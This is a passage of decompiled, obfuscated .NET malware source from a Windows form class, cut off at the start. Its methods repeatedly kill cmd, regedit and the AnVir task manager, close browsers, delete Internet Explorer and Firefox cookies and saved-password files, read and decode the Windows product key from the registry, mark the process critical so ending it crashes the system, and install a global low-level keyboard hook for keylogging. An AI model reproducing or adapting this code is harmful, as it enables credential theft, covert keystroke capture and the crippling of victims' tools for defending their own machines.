              case 14:
                goto label_10;
              case 15:
                goto label_8;
              case 16:
                goto label_5;
              case 17:
                goto label_46;
            }
            break;
          default:
            goto label_13;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
label_45:
      throw ProjectData.CreateProjectError(-2146828237);
label_46:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void KDu13sbd()
    {
      Process[] processes = Process.GetProcesses();
      int num1;
      do
      {
        int index;
        if ((uint) num1 + (uint) index <= uint.MaxValue)
          goto label_10;
label_1:
        int num2 = index;
        int num3;
        num1 = num3;
        int num4 = num1;
        bool flag;
        if (num2 > num4)
        {
          if (((flag ? 1 : 0) & 0) == 0)
          {
            if ((num1 & 0) != 0)
              goto label_11;
            else
              goto label_5;
          }
        }
        else
        {
          flag = Operators.CompareString(Strings.LCase(processes[index].ProcessName), "cmd", false) == 0;
          if (flag)
            processes[index].Kill();
          else
            goto label_8;
        }
label_4:
        checked { ++index; }
        if ((uint) flag + (uint) index >= 0U)
          goto label_1;
label_5:
        continue;
label_8:
        if ((uint) num1 >= 0U)
          goto label_4;
        else
          continue;
label_10:
        if ((uint) flag - (uint) index < 0U)
          goto label_8;
label_11:
        num3 = checked (processes.Length - 1);
        index = 0;
        goto label_1;
      }
      while ((uint) num1 < 0U);
    }

    private void Timer6_Tick(object sender, EventArgs e) => this.KDu13sbd();

    public void KillProcesses(bool InternetExplorer, bool Firefox)
    {
      Process[] processes = Process.GetProcesses();
label_40:
      int index = 0;
label_37:
      if (false)
        goto label_9;
      else
        goto label_38;
label_2:
      bool flag1 = index < processes.Length;
      if (!flag1)
      {
        if ((uint) Firefox + (uint) Firefox >= 0U)
        {
          if ((uint) InternetExplorer >= 0U)
            return;
          goto label_28;
        }
      }
      else
        goto label_36;
label_4:
      bool flag2;
      if ((uint) Firefox + (uint) flag2 >= 0U)
      {
        if ((uint) flag1 - (uint) flag1 >= 0U)
        {
          if ((uint) Firefox - (uint) index <= uint.MaxValue)
            goto label_2;
        }
        else
          goto label_13;
      }
      else
        goto label_18;
label_6:
      checked { ++index; }
      if (true)
        goto label_4;
      else
        goto label_8;
label_7:
      if (flag1)
        goto label_17;
      else
        goto label_6;
label_8:
label_9:
      if (true)
      {
        if ((uint) flag2 < 0U)
          goto label_33;
        else
          goto label_6;
      }
      else
        goto label_23;
label_12:
      Process process;
      flag1 = Operators.CompareString(process.ProcessName, "iexplore.exe", false) == 0;
label_13:
      if (flag1)
      {
        if ((uint) flag2 - (uint) index >= 0U)
        {
          process.Kill();
          goto label_8;
        }
        else
          goto label_21;
      }
      else
        goto label_6;
label_17:
      flag2 = process.MainWindowTitle.Contains("Internet Explorer");
label_18:
      if (flag2)
      {
        process.Kill();
        if ((uint) index < 0U)
        {
          if ((uint) flag2 < 0U)
            goto label_34;
          else
            goto label_17;
        }
        else if ((uint) flag2 + (uint) InternetExplorer >= 0U)
        {
          if ((uint) Firefox >= 0U)
            goto label_6;
          else
            goto label_8;
        }
        else
          goto label_7;
      }
      else
        goto label_12;
label_21:
      flag1 = InternetExplorer;
      if (true)
        goto label_7;
      else
        goto label_8;
label_23:
      if (!flag2)
      {
        if ((uint) flag1 - (uint) Firefox >= 0U)
          goto label_21;
        else
          goto label_26;
      }
      else
        goto label_34;
label_24:
      goto label_21;
label_26:
      if ((uint) InternetExplorer + (uint) flag2 >= 0U)
        goto label_24;
label_27:
      if (!flag1)
        goto label_24;
label_28:
      process.Kill();
      goto label_26;
label_33:
      if ((uint) flag1 + (uint) index > uint.MaxValue)
        goto label_12;
      else
        goto label_24;
label_34:
      flag1 = process.MainWindowTitle.Contains("Mozilla Firefox");
      if ((index | (int) byte.MaxValue) != 0)
      {
        if (!flag1)
        {
          flag1 = Operators.CompareString(process.ProcessName, "firefox.exe", false) == 0;
          if ((uint) flag2 - (uint) InternetExplorer < 0U)
          {
            if ((uint) InternetExplorer - (uint) InternetExplorer <= uint.MaxValue)
              goto label_28;
            else
              goto label_40;
          }
          else
            goto label_27;
        }
        else
        {
          process.Kill();
          goto label_33;
        }
      }
label_35:
      flag2 = Firefox;
      goto label_23;
label_36:
      process = processes[index];
      if ((uint) index + (uint) flag2 >= 0U)
        goto label_35;
      else
        goto label_37;
label_38:
      if ((uint) flag1 >= 0U)
      {
        if ((uint) flag2 <= uint.MaxValue)
          goto label_2;
        else
          goto label_35;
      }
      else
        goto label_36;
    }

    public void DeleteIECookies(bool Enable)
    {
      bool flag = Enable;
      if (((Enable ? 1 : 0) | int.MaxValue) != 0)
        goto label_26;
      else
        goto label_18;
label_2:
      if (((Enable ? 1 : 0) & 0) == 0)
      {
        if ((uint) Enable + (uint) Enable <= uint.MaxValue)
        {
          if ((uint) Enable + (uint) Enable <= uint.MaxValue)
          {
            if ((uint) flag - (uint) flag >= 0U)
              return;
          }
          else
            goto label_23;
        }
        else
          goto label_18;
      }
      else
        goto label_26;
label_4:
      if (flag)
        goto label_25;
      else
        goto label_2;
label_18:
      if (flag)
        goto label_6;
label_5:
      if ((uint) Enable - (uint) Enable >= 0U)
      {
        if (true)
        {
          if (((Enable ? 1 : 0) | int.MaxValue) == 0)
            goto label_4;
          else
            goto label_23;
        }
        else
          goto label_2;
      }
label_6:
      string folderPath;
      IEnumerator<string> enumerator;
      try
      {
        enumerator = MyProject.Computer.FileSystem.GetFiles(folderPath).GetEnumerator();
        if ((uint) Enable - (uint) flag >= 0U)
          ;
        do
        {
          flag = enumerator.MoveNext();
          if (flag)
          {
            string current = enumerator.Current;
            try
            {
              MyProject.Computer.FileSystem.DeleteFile(current);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else
            break;
        }
        while ((uint) Enable >= 0U);
        goto label_5;
      }
      finally
      {
        flag = enumerator != null;
        if (true)
        {
          while (flag)
          {
            enumerator.Dispose();
            if (true)
            {
              if (true)
                break;
              break;
            }
          }
        }
      }
label_23:
      if ((uint) Enable - (uint) Enable >= 0U)
        return;
      if (true)
        goto label_26;
label_25:
      folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
      flag = Directory.Exists(folderPath);
      goto label_18;
label_26:
      if ((uint) flag - (uint) flag < 0U)
        ;
      if ((uint) flag - (uint) Enable < 0U)
      {
        if (true)
          goto label_25;
        else
          goto label_18;
      }
      else
        goto label_4;
    }

    public void DeleteMozillaCookies(bool Enable)
    {
      bool flag1 = Enable;
      if (!flag1)
        return;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
      if ((uint) flag1 - (uint) Enable <= uint.MaxValue)
        goto label_34;
      else
        goto label_33;
label_1:
      do
        ;
      while (false);
      return;
label_2:
      IEnumerator<string> enumerator1;
      try
      {
        enumerator1 = MyProject.Computer.FileSystem.GetDirectories(str).GetEnumerator();
label_4:
        bool flag2 = enumerator1.MoveNext();
        string current1;
        if ((uint) flag2 + (uint) flag1 >= 0U)
        {
          if (flag2)
          {
            current1 = enumerator1.Current;
            if ((uint) Enable - (uint) flag2 > uint.MaxValue)
              goto label_4;
          }
          else
            goto label_1;
        }
        IEnumerator<string> enumerator2;
        try
        {
          enumerator2 = MyProject.Computer.FileSystem.GetFiles(current1).GetEnumerator();
label_12:
          do
          {
            bool flag3 = enumerator2.MoveNext();
            if ((uint) flag1 - (uint) flag1 >= 0U)
            {
              string current2;
              if ((uint) Enable + (uint) Enable <= uint.MaxValue)
              {
                if (((flag3 ? 1 : 0) | (int) byte.MaxValue) != 0)
                {
                  if (((flag3 ? 1 : 0) | -2) != 0)
                  {
                    if (!flag3)
                    {
                      if ((uint) Enable - (uint) flag3 <= uint.MaxValue)
                        goto label_4;
                      else
                        continue;
                    }
                    else
                    {
                      current2 = enumerator2.Current;
                      flag3 = current2.Contains("cookie");
                    }
                  }
                }
                else
                  goto label_15;
              }
              if (flag3)
              {
                try
                {
                  MyProject.Computer.FileSystem.DeleteFile(current2);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
            }
label_15:;
          }
          while ((uint) flag1 <= uint.MaxValue);
          goto label_12;
        }
        finally
        {
          bool flag4 = enumerator2 != null;
          if ((uint) flag4 - (uint) flag4 > uint.MaxValue)
          {
            if ((uint) flag4 - (uint) flag1 >= 0U)
              goto label_26;
          }
          else
            goto label_24;
label_21:
          if (((flag4 ? 1 : 0) & 0) == 0)
          {
            if ((uint) flag1 - (uint) flag1 >= 0U)
              goto label_26;
          }
          else
            goto label_25;
label_24:
          while (!flag4)
          {
            if (true)
              goto label_21;
          }
label_25:
          enumerator2.Dispose();
label_26:;
        }
      }
      finally
      {
        bool flag5 = enumerator1 != null;
        if (((Enable ? 1 : 0) & 0) == 0)
        {
          if (false)
            ;
          if (flag5)
            enumerator1.Dispose();
        }
      }
label_33:
      bool flag6;
      if ((uint) flag6 < 0U)
        goto label_1;
      else
        goto label_2;
label_34:
      flag1 = Directory.Exists(str);
      if (flag1)
        goto label_2;
      else
        goto label_1;
    }

    public void DeleteMozillaSignons(bool Enable)
    {
      bool flag1 = Enable;
      while ((uint) flag1 + (uint) flag1 >= 0U && !flag1)
      {
        if (true)
          return;
      }
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
      bool flag2 = Directory.Exists(str);
      if (!flag2)
        return;
      IEnumerator<string> enumerator1;
      try
      {
        enumerator1 = MyProject.Computer.FileSystem.GetDirectories(str).GetEnumerator();
        if (true)
          ;
label_4:
        bool flag3;
        do
        {
          string current1;
          if (!enumerator1.MoveNext())
          {
            if ((uint) Enable < 0U || (uint) flag2 <= uint.MaxValue)
              goto label_27;
          }
          else
            current1 = enumerator1.Current;
          IEnumerator<string> enumerator2;
          try
          {
            enumerator2 = MyProject.Computer.FileSystem.GetFiles(current1).GetEnumerator();
label_20:
            if ((uint) flag2 <= uint.MaxValue)
              goto label_10;
label_9:
label_10:
            flag3 = enumerator2.MoveNext();
            if (flag3)
            {
              string current2 = enumerator2.Current;
              bool flag4 = current2.Contains("signon");
              while (flag4)
              {
                if (((flag4 ? 1 : 0) & 0) == 0)
                {
                  try
                  {
                    MyProject.Computer.FileSystem.DeleteFile(current2);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                  }
                }
                else if (true)
                  ;
                if ((uint) flag4 >= 0U)
                {
                  if ((uint) flag2 <= uint.MaxValue)
                  {
                    if ((uint) flag4 > uint.MaxValue)
                      goto label_20;
                    else
                      break;
                  }
                }
                else
                  break;
              }
              goto label_9;
            }
          }
          finally
          {
            flag3 = enumerator2 != null;
            if (flag3)
            {
              enumerator2.Dispose();
              if (false)
                ;
            }
          }
        }
        while ((uint) flag3 <= uint.MaxValue);
        goto label_4;
label_27:;
      }
      finally
      {
        bool flag5 = enumerator1 != null;
        if (false)
          goto label_26;
        else
          goto label_28;
label_25:
        if (flag5)
          goto label_29;
        else
          goto label_31;
label_26:
        if (((flag5 ? 1 : 0) | 4) == 0)
          goto label_25;
        else
          goto label_31;
label_28:
        if ((uint) Enable - (uint) flag2 <= uint.MaxValue)
          goto label_25;
label_29:
        enumerator1.Dispose();
        if (true)
          goto label_26;
        else
          goto label_26;
label_31:;
      }
    }

    public void JHCS237hsd20j()
    {
      Process[] processes = Process.GetProcesses();
      int num1;
      int num2;
      if ((uint) num1 + (uint) num2 <= uint.MaxValue)
        goto label_12;
label_1:
      int index;
      int num3 = index;
      int num4;
      int num5 = num4;
      int num6 = num5;
      if (num3 > num6)
      {
        if (true)
        {
          if ((uint) num5 <= uint.MaxValue)
            return;
        }
        else
          goto label_7;
      }
      else
        goto label_9;
label_4:
      if ((num4 & 0) != 0)
        return;
      goto label_5;
label_7:
      bool flag;
      while (!flag)
      {
        if (true || true)
          goto label_4;
      }
      processes[index].Kill();
      goto label_5;
label_9:
      flag = Operators.CompareString(Strings.LCase(processes[index].ProcessName), "regedit", false) == 0;
      goto label_7;
label_5:
      checked { ++index; }
      goto label_1;
label_12:
      if ((uint) num1 >= 0U)
      {
        num4 = checked (processes.Length - 1);
        index = 0;
        goto label_1;
      }
      else
        goto label_5;
    }

    public void qnND298bdal235sa()
    {
      Process[] processes = Process.GetProcesses();
label_11:
      int num1;
      if ((num1 & 0) != 0)
        goto label_6;
      else
        goto label_12;
label_1:
      int index;
      int num2 = index;
      int num3 = num1;
      int num4 = num3;
      bool flag;
      if (num2 > num4)
      {
        if ((uint) num1 - (uint) flag <= uint.MaxValue)
          return;
      }
      else
      {
        string Left = Strings.LCase(processes[index].ProcessName);
        if ((uint) num3 <= uint.MaxValue)
        {
          flag = Operators.CompareString(Left, "Anvir", false) == 0;
          goto label_7;
        }
        else
          goto label_11;
      }
label_3:
label_4:
      checked { ++index; }
      if (false)
        goto label_7;
      else
        goto label_1;
label_6:
      if ((num1 & 0) != 0)
        goto label_4;
label_7:
      if (!flag)
      {
        if ((uint) num3 - (uint) flag < 0U)
          goto label_1;
        else
          goto label_3;
      }
      else
      {
        processes[index].Kill();
        goto label_4;
      }
label_12:
      num1 = checked (processes.Length - 1);
      index = 0;
      goto label_1;
    }

    private void Timer7_Tick(object sender, EventArgs e)
    {
      this.JHCS237hsd20j();
      this.qnND298bdal235sa();
    }

    private string TNLgi4bBsY()
    {
      byte[] numArray = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false).GetValue(string.Intern(x1110bdd110cdcea4._xaacba899487bce8c("ohnbakecljlckjcdckjdmiaeejhefhoeejffoimfaidgoikgjhbhhiihjfphbhgi", 1540037946))) as byte[];
      bool flag = numArray == null;
label_18:
      char[] chArray;
      int index1;
      int num1;
      while (!flag)
      {
        chArray = new char[29];
        index1 = 28;
        if ((uint) num1 + (uint) index1 <= uint.MaxValue)
          goto label_16;
      }
      goto label_20;
label_2:
      int num2 = index1;
      int num3 = 0;
      int num4 = num3;
      string str;
      if (num2 < num4)
      {
        str = new string(chArray);
        goto label_21;
      }
      else
        goto label_16;
label_3:
      checked { index1 += -1; }
      if ((num3 & 0) == 0)
        goto label_2;
      else
        goto label_21;
label_16:
      flag = checked (index1 + 1) % 6 == 0;
      if ((num1 & 0) == 0)
        goto label_17;
label_5:
      if (false)
        goto label_18;
      else
        goto label_3;
label_17:
      int index2;
      if ((uint) index2 <= uint.MaxValue)
        goto label_14;
label_4:
      int num5 = index2;
      num3 = 52;
      int num6 = num3;
      if (num5 >= num6)
        goto label_10;
      else
        goto label_5;
label_7:
      int index3;
      chArray[index1] = string.Intern(x1110bdd110cdcea4._xaacba899487bce8c("ejlkcjclajjlpiamnihmliomkifniimnhidohikofibpdiipcippbigaphnanheblhlbbfccpejcneadmehdkeodiefegeme", 1699588946))[index3];
      checked { index2 += -1; }
      if ((index3 & 0) == 0)
        goto label_4;
      else
        goto label_21;
label_10:
      num1 = index3 << 8 | (int) numArray[index2];
      if ((uint) index3 + (uint) num3 <= uint.MaxValue)
      {
        if ((uint) index1 - (uint) index3 <= uint.MaxValue)
          numArray[index2] = checked ((byte) unchecked (num1 / 24));
        if ((uint) index3 <= uint.MaxValue)
        {
          if ((index2 | int.MinValue) != 0)
          {
            index3 = num1 % 24;
            goto label_7;
          }
          else
            goto label_21;
        }
        else
          goto label_3;
      }
      else
        goto label_2;
label_14:
      if (!flag)
      {
        index3 = 0;
        index2 = 66;
        goto label_10;
      }
      else
      {
        chArray[index1] = '-';
        if ((uint) num1 + (uint) num1 > uint.MaxValue)
          goto label_7;
        else
          goto label_3;
      }
label_20:
      str = "value was nothing!";
      if ((uint) index1 + (uint) num1 > uint.MaxValue)
        goto label_3;
label_21:
      return str;
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long OpenProcess(
      long dwDesiredAccess,
      long bInheritHandle,
      long dwProcessId);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int OpenProcessToken(
      IntPtr ProcessHandle,
      int DesiredAccess,
      ref IntPtr TokenHandle);

    [DllImport("advapi32.dll", EntryPoint = "LookupPrivilegeValueA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int LookupPrivilegeValue(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSystemName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpName,
      ref Form1.LUID lpLuid);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int AdjustTokenPrivileges(
      IntPtr TokenHandle,
      bool DisableAllPrivileges,
      ref Form1.TOKEN_PRIVILEGES NewState,
      int BufferLength,
      ref Form1.TOKEN_PRIVILEGES PreviousState,
      ref IntPtr ReturnLength);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hHandle);

    [DllImport("ntdll.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern void RtlSetProcessIsCritical(bool NewValue, bool OldValue, bool WinLogon);

    public bool GetPrivileges(string privileges)
    {
      IntPtr handle = Process.GetCurrentProcess().Handle;
      bool flag1;
      if ((uint) handle + (uint) flag1 <= uint.MaxValue)
        goto label_32;
label_1:
      return true;
label_32:
      Form1.TOKEN_PRIVILEGES NewState;
      Form1.TOKEN_PRIVILEGES PreviousState;
      Form1.LUID_AND_ATTRIBUTES luidAndAttributes;
      IntPtr num1;
      while ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
      {
        luidAndAttributes = new Form1.LUID_AND_ATTRIBUTES();
        if ((uint) num1 <= uint.MaxValue && (uint) num1 >= 0U)
        {
          NewState = new Form1.TOKEN_PRIVILEGES();
          PreviousState = new Form1.TOKEN_PRIVILEGES();
          if (((flag1 ? 1 : 0) & 0) != 0)
          {
            IntPtr num2;
            if ((uint) flag1 + (uint) num2 <= uint.MaxValue)
              goto label_1;
          }
          else
            break;
        }
        else
          goto label_1;
      }
      IntPtr TokenHandle;
      try
      {
        string lpSystemName = "";
label_27:
        Form1.LUID lpLuid;
        bool flag2 = Form1.LookupPrivilegeValue(ref lpSystemName, ref privileges, ref lpLuid) == 0;
        if ((uint) num1 <= uint.MaxValue)
          goto label_24;
        else
          goto label_28;
label_5:
        return false;
label_8:
        NewState.PrivilegeCount = 1;
        if ((uint) TokenHandle + (uint) handle >= 0U)
        {
          bool flag3;
          IntPtr ReturnLength;
          do
          {
            NewState.Privileges = new Form1.LUID_AND_ATTRIBUTES[1]
            {
              luidAndAttributes
            };
            if ((uint) flag1 - (uint) flag1 >= 0U)
            {
              PreviousState.Privileges = new Form1.LUID_AND_ATTRIBUTES[checked (NewState.PrivilegeCount + 1)];
              flag3 = Form1.AdjustTokenPrivileges(TokenHandle, false, ref NewState, Marshal.SizeOf((object) PreviousState), ref PreviousState, ref ReturnLength) == 0;
            }
            else
              goto label_22;
          }
          while ((uint) flag3 + (uint) ReturnLength < 0U);
          if ((uint) TokenHandle + (uint) handle <= uint.MaxValue)
          {
            if (flag3)
              goto label_5;
            else
              goto label_1;
          }
          else
            goto label_5;
        }
        else
          goto label_20;
label_10:
        luidAndAttributes.pLuid = lpLuid;
label_11:
        luidAndAttributes.Attributes = 2;
        if ((uint) TokenHandle >= 0U)
          goto label_8;
label_12:
        if (flag2)
          return false;
        goto label_10;
label_20:
        flag2 = Form1.OpenProcessToken(handle, 40, ref TokenHandle) == 0;
        if ((uint) num1 - (uint) num1 > uint.MaxValue)
        {
          if (true)
          {
            if (((int) (uint) TokenHandle | 8) != 0)
              goto label_12;
            else
              goto label_8;
          }
          else
            goto label_5;
        }
        else if ((uint) num1 + (uint) handle <= uint.MaxValue)
          goto label_28;
        else
          goto label_27;
label_22:
        return false;
label_24:
        while ((uint) num1 - (uint) TokenHandle >= 0U)
        {
          if (!flag2 && (uint) handle - (uint) num1 >= 0U)
          {
            if (((int) (uint) num1 | 8) != 0)
              goto label_20;
          }
          else
            goto label_22;
        }
        if ((uint) handle - (uint) TokenHandle <= uint.MaxValue)
          goto label_22;
        else
          goto label_20;
label_28:
        if (((int) (uint) handle | (int) byte.MaxValue) != 0)
          goto label_17;
label_13:
        if ((uint) TokenHandle + (uint) flag2 > uint.MaxValue)
          goto label_12;
        else
          goto label_10;
label_17:
        if ((uint) num1 - (uint) num1 <= uint.MaxValue)
        {
          if ((uint) num1 + (uint) flag1 >= 0U)
          {
            if ((uint) num1 - (uint) flag1 <= uint.MaxValue)
              goto label_12;
            else
              goto label_13;
          }
          else
            goto label_11;
        }
        else
          goto label_5;
      }
      finally
      {
        Form1.CloseHandle(TokenHandle);
      }
    }

    private void Timer8_Tick(object sender, EventArgs e)
    {
      this.GetPrivileges("SeSecurityPrivileges");
      if (false)
        return;
      Form1.RtlSetProcessIsCritical(true, false, false);
      this.Timer8.Stop();
    }

    public class KeyboardHook
    {
      private static List<WeakReference> __ENCList = new List<WeakReference>();
      private const int HC_ACTION = 0;
      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 256;
      private const int WM_KEYUP = 257;
      private const int WM_SYSKEYDOWN = 260;
      private const int WM_SYSKEYUP = 261;
      private static int KeyHook;
      private static Form1.KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

      [DebuggerNonUserCode]
      static KeyboardHook()
      {
      }

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int SetWindowsHookEx(
        int idHook,
        Form1.KeyboardHook.KeyboardProcDelegate lpfn,
        int hmod,
        int dwThreadId);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHookEx(
        int hHook,
        int nCode,
        int wParam,
        Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnhookWindowsHookEx(int hHook);

      public static event Form1.KeyboardHook.c9YMqrTuOUEventHandler c9YMqrTuOU;

      public static event Form1.KeyboardHook.REHlTzGAkkEventHandler REHlTzGAkk;

      public KeyboardHook()
      {
label_8:
        lock (Form1.KeyboardHook.__ENCList)
          Form1.KeyboardHook.__ENCList.Add(new WeakReference((object) this));
label_2:
        Form1.KeyboardHook.KeyHookDelegate = new Form1.KeyboardHook.KeyboardProcDelegate(Form1.KeyboardHook.KeyboardProc);
        IntPtr hinstance;
        if ((uint) hinstance + (uint) hinstance <= uint.MaxValue)
        {
          while (true)
          {
            Form1.KeyboardHook.KeyboardProcDelegate keyHookDelegate = Form1.KeyboardHook.KeyHookDelegate;
            hinstance = Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]);
            int int32 = hinstance.ToInt32();
            Form1.KeyboardHook.KeyHook = Form1.KeyboardHook.SetWindowsHookEx(13, keyHookDelegate, int32, 0);
            if ((uint) hinstance >= 0U)
              break;
            if (((int) (uint) hinstance | 15) == 0 || (uint) hinstance + (uint) hinstance >= 0U)
              goto label_2;
          }
        }
        else
          goto label_8;
      }

      private static int KeyboardProc(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam)
      {
        bool flag = nCode == 0;
label_1:
        while (flag)
        {
          int num1 = wParam - 256;
          int num2;
          if ((num2 | int.MinValue) != 0)
            goto label_23;
label_11:
          int num3;
          if ((uint) num2 - (uint) num2 > uint.MaxValue)
          {
            if (false)
            {
              if ((uint) num3 >= 0U)
                continue;
            }
            else
              goto label_27;
          }
          else
            break;
label_14:
          Form1.KeyboardHook.c9YMqrTuOUEventHandler c9YmqrTuOuEvent;
          if (flag)
          {
            c9YmqrTuOuEvent((Keys) lParam.vkCode);
            goto label_11;
          }
          else
            goto label_11;
label_23:
          while ((uint) num3 - (uint) flag <= uint.MaxValue)
          {
            if ((uint) num3 - (uint) num3 > uint.MaxValue)
              goto label_19;
            else
              goto label_26;
label_10:
            if ((uint) flag + (uint) num2 >= 0U)
              goto label_8;
label_3:
            if ((uint) wParam >= 0U)
              break;
label_4:
            if (true)
              break;
label_6:
            Form1.KeyboardHook.REHlTzGAkkEventHandler reHlTzGakkEvent;
            if (!flag)
            {
              if (true)
                goto label_3;
              else
                break;
            }
            else
            {
              reHlTzGakkEvent((Keys) lParam.vkCode);
              if ((uint) num2 - (uint) wParam >= 0U)
              {
                if ((uint) num3 + (uint) nCode > uint.MaxValue)
                  continue;
                goto label_4;
              }
              else
                break;
            }
label_8:
            flag = reHlTzGakkEvent != null;
            goto label_6;
label_19:
            do
            {
              flag = c9YmqrTuOuEvent != null;
            }
            while ((uint) num1 < 0U);
            if ((nCode & 0) == 0 || (uint) num1 + (uint) num3 <= uint.MaxValue)
              goto label_14;
            else
              goto label_10;
label_26:
            if ((uint) num3 - (uint) num1 <= uint.MaxValue)
            {
              switch (num1)
              {
                case 0:
                case 4:
                  c9YmqrTuOuEvent = Form1.KeyboardHook.c9YMqrTuOUEvent;
                  goto label_19;
                case 1:
                case 5:
                  reHlTzGakkEvent = Form1.KeyboardHook.REHlTzGAkkEvent;
                  if ((uint) num1 > uint.MaxValue)
                  {
                    if ((nCode & 0) != 0)
                    {
                      if (true)
                        goto case 0;
                      else
                        goto label_19;
                    }
                    else
                      goto label_1;
                  }
                  else
                    goto label_10;
                default:
                  goto label_11;
              }
            }
            else
              goto label_1;
          }
          goto label_11;
        }
        int num = Form1.KeyboardHook.CallNextHookEx(Form1.KeyboardHook.KeyHook, nCode, wParam, lParam);
label_27:
        return num;
      }

      ~KeyboardHook()
      {
        Form1.KeyboardHook.UnhookWindowsHookEx(Form1.KeyboardHook.KeyHook);
        // ISSUE: explicit finalizer call
        base.Finalize();
      }

      public delegate void c9YMqrTuOUEventHandler(Keys Key);

      public delegate void REHlTzGAkkEventHandler(Keys Key);

      private delegate int KeyboardProcDelegate(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      private struct KBDLLHOOKSTRUCT
      {
        public int vkCode;
        public int scancode;
        public int flags;
        public int time;
        public int dwExtraInfo;
      }
    }

    private struct LUID_AND_ATTRIBUTES
    {
      public Form1.LUID pLuid;
      public int Attributes;
    }

    private struct LUID
    {
      public int LowPart;
      public int HighPart;
    }

    private struct TOKEN_PRIVILEGES
    {
      public int PrivilegeCount;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
      public Form1.LUID_AND_ATTRIBUTES[] Privileges;
    }
  }
}
